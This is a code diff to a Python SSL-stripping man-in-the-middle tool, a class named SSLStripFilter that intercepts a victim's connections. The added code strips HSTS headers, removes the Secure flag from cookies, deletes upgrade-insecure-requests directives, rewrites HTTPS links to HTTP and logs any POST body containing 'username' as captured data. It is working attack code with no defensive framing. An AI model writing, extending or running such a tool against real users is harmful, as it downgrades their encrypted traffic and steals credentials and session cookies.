@@ -14,9 +14,10 @@ class SSLStripFilter:
     And rewrites responses to downgrade HTTPS links to HTTP.
     """
 
-    def __init__(self, victim_ip, logger):
+    def __init__(self, victim_ip, logger, target_ip=None):
         self.victim_ip = victim_ip
         self.logger = logger
+        self.target_ip = target_ip
         # Map (victim_port) -> { 'server_sock': socket, 'server_ip': ip, 'ssl': bool, 'seq': int, 'ack': int }
         self.sessions = {} 
     
@@ -43,6 +44,9 @@ class SSLStripFilter:
         tcp = packet[TCP]
         victim_port = tcp.sport
         
+        # DEBUG: Print packet summary
+        self.logger(f"[DEBUG] Pkt from {ip.src}:{victim_port} Flags={tcp.flags} Len={len(tcp.payload)}")
+
         # 1. Handle New Connection (SYN)
         if tcp.flags == 'S':
             self.logger(f"[SSLStrip] New connection from {self.victim_ip}:{victim_port} to {ip.dst}:80")
@@ -120,7 +124,17 @@ class SSLStripFilter:
         if not session['server_sock']:
             try:
                 # Default to HTTP initially
-                s = socket.create_connection((session['server_ip'], 80))
+                try:
+                    s = socket.create_connection((session['server_ip'], 80), timeout=5)
+                except Exception as e:
+                    # If we are spoofing a server that is local (e.g. Attacker is acting as server),
+                    # and the IP is unreachable or we are loopback, try connecting to localhost if targeted.
+                    if self.target_ip and session['server_ip'] == self.target_ip:
+                        self.logger(f"[SSLStrip] Connection to {session['server_ip']} failed. Trying localhost fallback...")
+                        s = socket.create_connection(('127.0.0.1', 80), timeout=5)
+                    else:
+                        raise e
+
                 session['server_sock'] = s
                 
                 # Start a thread to read from server
@@ -136,6 +150,21 @@ class SSLStripFilter:
             # Rewrite headers to prevent compression (so we can replace text easily)
             payload = payload.replace(b"Accept-Encoding: gzip", b"Accept-Encoding: identity")
             
+            # Prevent server from knowing client wants HTTPS
+            payload = re.sub(rb'(?i)Upgrade-Insecure-Requests: 1\r\n', b'', payload)
+            
+            # --- CAPTURE CREDENTIALS ---
+            try:
+                decoded_payload = payload.decode('utf-8', errors='ignore')
+                if "POST" in decoded_payload and "username" in decoded_payload:
+                     self.logger("\n[!!!] CAPTURED INTERESTING DATA [!!!]")
+                     self.logger("--------------------------------------------------")
+                     self.logger(decoded_payload)
+                     self.logger("--------------------------------------------------\n")
+            except:
+                pass
+            # ---------------------------
+
             # Save payload in case we need to replay it after an SSL upgrade
             session['last_request_payload'] = payload
             
@@ -164,7 +193,16 @@ class SSLStripFilter:
                         context.check_hostname = False
                         context.verify_mode = ssl.CERT_NONE
                         
-                        raw_sock = socket.create_connection((session['server_ip'], 443))
+                        try:
+                            raw_sock = socket.create_connection((session['server_ip'], 443), timeout=5)
+                        except Exception as e:
+                            # Fallback to localhost if needed
+                            if self.target_ip and session['server_ip'] == self.target_ip:
+                                self.logger(f"[SSLStrip] SSL Connection to {session['server_ip']} failed. Trying localhost fallback...")
+                                raw_sock = socket.create_connection(('127.0.0.1', 443), timeout=5)
+                            else:
+                                raise e
+
                         ssl_sock = context.wrap_socket(raw_sock, server_hostname=session['server_ip'])
                         
                         # 2. Swap the socket in the session
@@ -194,7 +232,16 @@ class SSLStripFilter:
                 # This is a naive replacement, but works for PoC
                 data = data.replace(b"https://", b"http://")
                 
-                # -----------------------
+                # --- NEW SSL STRIPPING LOGIC ---
+                # Strip HSTS Header (Forces browser to use HTTPS)
+                data = re.sub(rb'(?i)Strict-Transport-Security:.[^\r\n]*\r\n', b'', data)
+
+                # Strip Secure flag from Cookies (Allows sending cookies over HTTP)
+                data = re.sub(rb'(?i); Secure', b'', data)
+                
+                # Strip CSP Upgrade-Insecure-Requests
+                data = data.replace(b"upgrade-insecure-requests", b"")
+                # -------------------------------
 
                 # Send to victim
                 self.send_to_victim(session, data, original_packet)
@@ -204,7 +251,11 @@ class SSLStripFilter:
         
         # Close session
         if session['server_sock']:
-            session['server_sock'].close()
+            try:
+                session['server_sock'].close()
+            except:
+                pass
+            session['server_sock'] = None
 
     def send_to_victim(self, session, data, original_packet):
         ip = original_packet[IP]
